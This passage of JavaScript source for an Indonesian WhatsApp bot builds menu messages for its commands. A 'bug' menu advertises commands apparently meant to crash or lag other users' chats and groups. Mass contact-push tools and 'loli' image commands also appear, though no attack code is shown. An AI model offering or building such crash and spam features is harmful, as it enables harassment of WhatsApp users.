    ◦ .ᴛᴛsᴛᴀʟᴋ 
    ◦ .ɢʜsᴛᴀʟᴋ 
    ◦ .ᴛᴡsᴛᴀʟᴋ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: eee,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'textpromenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let hdh = '```'
            let mmg = `${hdh}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${hdh}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗧 𝗘 𝗫 𝗧 𝗣 𝗥 𝗢 - 𝗠 𝗘 𝗡 𝗨

    ◦  .ʙʟᴀᴄᴋᴘɪɴᴋ 
    ◦  .ɴᴇᴏɴ 
    ◦  .ɢʀᴇᴇɴɴᴇᴏɴ 
    ◦  .ᴀᴅᴠᴀɴᴄᴇɢʟᴏᴡ
    ◦  .ғᴜᴛᴜʀᴇɴᴇᴏɴ 
    ◦  .sᴀɴᴅᴡʀɪᴛɪɴɢ 
    ◦  .sᴀɴᴅsᴜᴍᴍᴇʀ 
    ◦  .sᴀɴᴅᴇɴɢʀᴀᴠᴇᴅ
    ◦  .ᴍᴇᴛᴀʟᴅᴀʀᴋ 
    ◦  .ɴᴇᴏɴʟɪɢʜᴛ 
    ◦  .ʜᴏʟᴏɢʀᴀᴘʜɪᴄ 
    ◦  .ᴛᴇxᴛ1917 
    ◦  .ᴍɪɴɪᴏɴ
    ◦  .ᴅᴇʟᴜxᴇsɪʟᴠᴇʀ 
    ◦  .ɴᴇᴡʏᴇᴀʀᴄᴀʀᴅ 
    ◦  .ʙʟᴏᴏᴅғʀᴏsᴛᴇᴅ
    ◦  .ʜᴀʟʟᴏᴡᴇᴇɴ 
    ◦  .ᴊᴏᴋᴇʀʟᴏɢᴏ
    ◦  .ғɪʀᴇᴡᴏʀᴋsᴘᴀʀᴋʟᴇ 
    ◦  .ɴᴀᴛᴜʀᴇʟᴇᴀᴠᴇs
    ◦  .ʙᴏᴋᴇʜ 
    ◦  .ᴛᴏxɪᴄ
    ◦  .sᴛʀᴀᴡʙᴇʀʀʏ 
    ◦  .ʙᴏx3ᴅ
    ◦  .ʀᴏᴀᴅᴡᴀʀɴɪɴɢ 
    ◦  .ʙʀᴇᴀᴋᴡᴀʟʟ
    ◦  .ɪᴄᴇᴄᴏʟᴅ 
    ◦  .ʟᴜxᴜʀʏ
    ◦  .ᴄʟᴏᴜᴅ 
    ◦  .sᴜᴍᴍᴇʀsᴀɴᴅ 
    ◦  .ʜᴏʀʀᴏʀʙʟᴏᴏᴅ 
    ◦  .ᴛʜᴜɴᴅᴇʀ 
    ◦  .ᴘᴏʀɴʜᴜʙ
    ◦  .ɢʟɪᴛᴄʜ
    ◦  .ᴀᴠᴇɴɢᴇʀ
    ◦  .sᴘᴀᴄᴇ
    ◦  .ɴɪɴᴊᴀʟᴏɢᴏ 
    ◦  .ᴍᴀʀᴠᴇʟsᴛᴜᴅɪᴏ 
    ◦  .ʟɪᴏɴʟᴏɢᴏ 
    ◦  .ᴡᴏʟғʟᴏɢᴏ 
    ◦  .sᴛᴇᴇʟ3ᴅ 
    ◦  .ᴡᴀʟʟɢʀᴀᴠɪᴛʏ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: mmg,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'funmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let monoo = '```'
            let bott = `${monoo}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${monoo}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗙 𝗨 𝗡 - 𝗠 𝗘 𝗡 𝗨

    ◦  .ᴀᴘᴀᴋᴀʜ 
    ◦  .ʙɪsᴀᴋᴀʜ 
    ◦  .ʙᴀɢᴀɪᴍᴀɴᴀᴋᴀʜ 
    ◦  .ʀᴀᴛᴇ 
    ◦  .ɢᴀɴᴛᴇɴɢᴄᴇᴋ 
    ◦  .ᴄᴇᴋɢᴀɴᴛᴇɴɢ 
    ◦  .ᴄᴀɴᴛɪᴋᴄᴇᴋ 
    ◦  .ᴄᴇᴋᴄᴀɴᴛɪᴋ 
    ◦  .sᴀɴɢᴇᴄᴇᴋ 
    ◦  .ᴄᴇᴋsᴀɴɢᴇ 
    ◦  .ɢᴀʏᴄᴇᴋ 
    ◦  .ᴄᴇᴋɢᴀʏ 
    ◦  .ʟᴇsʙɪᴄᴇᴋ 
    ◦  .ᴄᴇᴋʟᴇsʙɪ
    ◦  .ᴋᴀᴘᴀɴᴋᴀʜ 
    ◦  .ᴡᴀɴɢʏ 
    ◦  .ᴄᴇᴋᴍᴀᴛɪ 
    ◦  .ʜᴀʟᴀʜ
    ◦  .ʜɪʟɪʜ 
    ◦  .ʜᴜʟᴜʜ 
    ◦  .ʜᴇʟᴇʜ 
    ◦  .ʜᴏʟᴏʜ 
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: bott,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'convertmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let kaa = '```'
            let cnvrt = `${kaa}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${kaa}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗖 𝗢 𝗡 𝗩 𝗘 𝗥 𝗧 - 𝗠 𝗘 𝗡 𝗨

    ◦ .sᴛɪᴄᴋᴇʀ
    ◦ .sᴍᴇᴍᴇ
    ◦ .sᴡᴍ
    ◦ .sɴᴏʙɢ
    ◦ .ᴛᴏɪᴍᴀɢᴇ
    ◦ .ᴛᴏᴠɪᴅᴇᴏ
    ◦ .ᴛᴏᴀᴜᴅɪᴏ
    ◦ .ᴛᴏᴍᴘ3
    ◦ .ᴛᴏᴠɴ
    ◦ .ᴛᴏᴘᴛᴠ
    ◦ .ᴛᴏɢɪғ
    ◦ .ᴛᴏᴜʀʟ
    ◦ .ᴛᴏǫʀ
    ◦ .ʙᴀss
    ◦ .ʙʟᴏᴡɴ
    ◦ .ᴅᴇᴇᴘ
    ◦ .ᴇᴀʀʀᴀᴘᴇ
    ◦ .ғᴀsᴛ
    ◦ .ғᴀᴛ
    ◦ .ɴɪɢʜᴛᴄᴏʀᴇ
    ◦ .ʀᴇᴠᴇʀsᴇ
    ◦ .ʀᴏʙᴏᴛ
    ◦ .sʟᴏᴡ
    ◦ .sᴍᴏᴏᴛʜ
    ◦ .sǫᴜɪʀᴇʟ
    ◦ .ᴛᴏᴠɪᴇᴡᴏɴᴄᴇ
    ◦ .ғʟɪᴘᴛᴇxᴛ
    ◦ .ᴇᴍᴏᴊɪᴍɪx1
    ◦ .ᴇᴍᴏᴊɪᴍɪx2
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: cnvrt,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'datamenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let lg = '```'
            let dataa = `${lg}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${lg}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗗 𝗔 𝗧 𝗔 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ᴀᴅᴅᴠɪᴅᴇᴏ
    ◦ .ᴀᴅᴅɪᴍᴀɢᴇ
    ◦ .ᴀᴅᴅsᴛɪᴄᴋᴇʀ
    ◦ .ᴀᴅᴅᴠɴ
    ◦ .ᴅᴇʟᴠɪᴅᴇᴏ
    ◦ .ᴅᴇʟɪᴍᴀɢᴇ
    ◦ .ᴅᴇʟsᴛɪᴄᴋᴇʀ
    ◦ .ᴅᴇʟᴠɴ
    ◦ .ʟɪsᴛᴠɪᴅᴇᴏ
    ◦ .ʟɪsᴛɪᴍᴀɢᴇ
    ◦ .ʟɪsᴛsᴛɪᴄᴋᴇʀ
    ◦ .ʟɪsᴛᴠɴ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: dataa,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'gamemenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let mls = '```'
            let gem = `${mls}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${mls}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗚 𝗔 𝗠 𝗘 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ᴛɪᴄᴛᴀᴄᴛᴏᴇ
    ◦ .sᴜɪᴛᴘᴠᴘ
    ◦ .ᴋᴜɪsᴍᴀᴛʜ
    ◦ .ᴛᴇʙᴀᴋ ɢᴀᴍʙᴀʀ
    ◦ .ᴛᴇʙᴀᴋ ᴋᴀᴛᴀ
    ◦ .ᴛᴇʙᴀᴋ ᴋᴀʟɪᴍᴀᴛ
    ◦ .ᴛᴇʙᴀᴋ ʟɪʀɪᴋ
    ◦ .ᴛᴇʙᴀᴋ ᴛᴇʙᴀᴋᴀɴ
    ◦ .ᴛᴇʙᴀᴋ ʙᴇɴᴅᴇʀᴀ
    ◦ .ᴛᴇʙᴀᴋ ʙᴇɴᴅᴇʀᴀ2
    ◦ .ᴛᴇʙᴀᴋ ᴋɪᴍɪᴀ
    ◦ .ᴛᴇʙᴀᴋ ᴀsᴀʜᴏᴛᴀᴋ
    ◦ .ᴛᴇʙᴀᴋ sɪᴀᴘᴀᴋᴀʜᴀᴋᴜ
    ◦ .ᴛᴇʙᴀᴋ sᴜsᴜɴᴋᴀᴛᴀ
    ◦ .ᴛᴇʙᴀᴋ ᴛᴇᴋᴀᴛᴇᴋɪ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: gem,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'othersmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let ff = '```'
            let oth = `${ff}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${ff}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗢 𝗧 𝗛 𝗘 𝗥 𝗦 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ǫᴄ
    ◦ .ᴛᴛᴘ
    ◦ .ᴀᴛᴛᴘ
    ◦ .ʏᴛᴄᴏᴍᴍᴇɴᴛ
    ◦ .ʙᴏᴛᴄᴏᴍᴍᴇɴᴛ
    ◦ .ʀᴇᴍᴏᴠᴇʙɢ
    ◦ .ʀᴇᴍɪɴɪ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: oth,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'primbonmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let tai = '```'
            let ow = `${tai}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${tai}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗣 𝗥 𝗜 𝗠 𝗕 𝗢 𝗡 - 𝗠 𝗘 𝗡 𝗨

    ◦  .ɴᴏᴍᴏʀʜᴏᴋɪ 
    ◦  .ᴀʀᴛɪᴍɪᴍᴘɪ 
    ◦  .ᴀʀᴛɪɴᴀᴍᴀ 
    ◦  .ʀᴀᴍᴀʟᴊᴏᴅᴏʜ 
    ◦  .ʀᴀᴍᴀʟᴊᴏᴅᴏʜʙᴀʟɪ 
    ◦  .sᴜᴀᴍɪɪsᴛʀɪ
    ◦  .ʀᴀᴍᴀʟᴄɪɴᴛᴀ 
    ◦  .ᴄᴏᴄᴏᴋɴᴀᴍᴀ 
    ◦  .ᴘᴀsᴀɴɢᴀɴ 
    ◦  .ᴊᴀᴅɪᴀɴɴɪᴋᴀʜ 
    ◦  .sɪғᴀᴛᴜsᴀʜᴀ 
    ◦  .ʀᴇᴢᴇᴋɪ 
    ◦  .ᴘᴇᴋᴇʀᴊᴀᴀɴ 
    ◦  .ɴᴀsɪʙ 
    ◦  .ᴘᴇɴʏᴀᴋɪᴛ 
    ◦  .ᴛᴀʀᴏᴛ 
    ◦  .ғᴇɴɢsʜᴜɪ 
    ◦  .ʜᴀʀɪʙᴀɪᴋ 
    ◦  .ʜᴀʀɪsᴀɴɢᴀʀ 
    ◦  .ʜᴀʀɪsɪᴀʟ 
    ◦  .ɴᴀɢᴀʜᴀʀɪ 
    ◦  .ᴀʀᴀʜʀᴇᴢᴇᴋɪ 
    ◦  .ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ 
    ◦  .ᴡᴇᴛᴏɴ 
    ◦  .ᴋᴀʀᴀᴋᴛᴇʀ
    ◦  .ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ 
    ◦  .ᴍᴇᴍᴀɴᴄɪɴɢ 
    ◦  .ᴍᴀsᴀsᴜʙᴜʀ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: ow,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'downmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let eef = '```'
            let down = `${eef}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${eef}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗗 𝗢 𝗪 𝗡 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ᴛᴛᴅʟ
    ◦ .ᴛᴛᴀᴜᴅɪᴏ
    ◦ .ᴄᴏᴄᴏғᴜɴ
    ◦ .ᴍᴇᴅɪᴀғɪʀᴇ
    ◦ .ᴘɪɴᴅʟ
    ◦ .sɴᴀᴄᴋᴠɪᴅᴇᴏ
    ◦ .ʏᴛᴍᴘ3
    ◦ .ʏᴛᴍᴘ4
    ◦ .ɪɢᴅʟ
    ◦ .ɪɢᴅʟʜ

*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: down,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'bugmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let eeff = '```'
            let bugs = `${eeff}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${eeff}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗕 𝗨 𝗚 - 𝗠 𝗘 𝗡 𝗨

- ʙᴜɢ ɴᴜᴍʙᴇʀ
    ◦ .ʙᴜɢ1
    ◦ .ʙᴜɢ2
    ◦ .ʙᴜɢ3
    ◦ .ᴀᴍᴏᴜɴᴛʙᴜɢ
    ◦ .ᴘᴍʙᴜɢ 
    ◦ .ʙᴏᴍʙᴜɢ
    ◦ .ᴅᴇʟᴀʏʙᴜɢ
    ◦ .ᴜɴʟɪᴍɪᴛᴇᴅʙᴜɢ
    ◦ .ʟᴀɢʙᴜɢ
    ◦ .ᴅᴏᴄᴜʙᴜɢ
    ◦ .ᴛʀᴏʟʟʏʙᴜɢ

- ʙᴜɢ ɢʀᴏᴜᴘ
    ◦ .ɢᴄʙᴜɢ
    ◦ .ᴅᴇʟᴀʏɢᴄʙᴜɢ 
    ◦ .ʟᴀɢɢᴄʙᴜɢ 
    ◦ .ʙᴏᴍɢᴄʙᴜɢ 
    ◦ .ᴜɴʟɪᴍɪᴛᴇᴅɢᴄʙᴜɢ 
    ◦ .ᴅᴏᴄᴜɢᴄʙᴜɢ
    ◦ .ᴛʀᴏʟʟʏɢᴄʙᴜɢ

*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: bugs,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'premmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let ohw = '```'
            let premm = `${ohw}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${ohw}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗣 𝗥 𝗘 𝗠 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ʀᴇᴍɪɴɪᴠ2
    ◦ .ᴏᴘᴇɴᴀɪ
    ◦ .ᴛᴇʟᴇsᴛɪᴄᴋ
    ◦ .sʜᴏʀᴛʟɪɴᴋ
    ◦ .ssᴡᴇʙ
    ◦ .ᴡʜᴏɪs
    ◦ .sᴏᴜɴᴅ 1-160

*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: premm,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'animemenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let oh = '```'
            let anim = `${oh}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${oh}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗔 𝗡 𝗜 𝗠 𝗘 - 𝗠 𝗘 𝗡 𝗨

    ◦ .akira  
    ◦ .akiyama  
    ◦ .ana  
    ◦ .asuna  
    ◦ .ayuzawa  
    ◦ .boruto  
    ◦ .chiho  
    ◦ .chitoge  
    ◦ .cosplayloli  
    ◦ .cosplaysagiri  
    ◦ .deidara  
    ◦ .doraemon  
    ◦ .elaina  
    ◦ .emilia  
    ◦ .erza  
    ◦ .gremory  
    ◦ .hestia  
    ◦ .hinata  
    ◦ .husbu  
    ◦ .inori  
    ◦ .isuzu  
    ◦ .itachi  
    ◦ .itori  
    ◦ .kaga  
    ◦ .kagura  
    ◦ .kakasih  
    ◦ .kaori  
    ◦ .keneki  
    ◦ .kotori  
    ◦ .kurumi  
    ◦ .loli  
    ◦ .madara  
    ◦ .megumin  
    ◦ .mikasa  
    ◦ .mikey  
    ◦ .miku  
    ◦ .minato  
    ◦ .naruto  
    ◦ .neko  
    ◦ .neko2  
    ◦ .nekonime  
    ◦ .nezuko  
    ◦ .onepiece  
    ◦ .pokemon  
    ◦ .randomnime  
    ◦ .randomnime2  
    ◦ .rize  
    ◦ .sagiri  
    ◦ .sakura  
    ◦ .sasuke  
    ◦ .shina  
    ◦ .shinka  
    ◦ .shinomiya  
    ◦ .shizuka  
    ◦ .shota  
    ◦ .tejina  
    ◦ .toukachan  
    ◦ .tsunade  
    ◦ .waifu  
    ◦ .animewall  
    ◦ .yotsuba  
    ◦ .yuki  
    ◦ .yulibocil  
    ◦ .yumeko    
    ◦ .tickle  
    ◦ .gecg  
    ◦ .feed

*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: anim,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
            case 'allmenu':
            case 'help':
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
await loading()
let mono = '```'
let gege = '```'
let menunya = `${mono}Hallo ${pushname}\nI Am ${namabot}, Yang Akan Membantu Mu Seperti Download Video Dan Lain-Lain Hanya Lewat Whatsapp.${mono}

乂 𝗜 𝗡 𝗙 𝗢 - 𝗨 𝗦 𝗘 𝗥

 ◦ *Name* : ${pushname}
 ◦ *Number* : ${m.sender.split('@')[0]}
 ◦ *Premium* : ${isPremium ? 'Premium' : 'Gratisan'}

乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
 
${readmore}
${gege}乂 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨
    ◦ .delsesi
    ◦ .bcgc
    ◦ .bcimg
    ◦ .bchide
    ◦ .join
    ◦ .cekidgc
    ◦ .pushkontak
    ◦ .pushkontakv2
    ◦ .setimgqouted
    ◦ .setimgmenu
    ◦ .setvidmenu
    ◦ .cekapikey
    ◦ .shutdown 
    ◦ .autoread [option]
    ◦ .autobio [option]
    ◦ .mode [option]
    ◦ .setwm 
    ◦ .setlink
    ◦ .setppbot
    ◦ .block
    ◦ .unblock 
    ◦ .backup
    ◦ .getcase

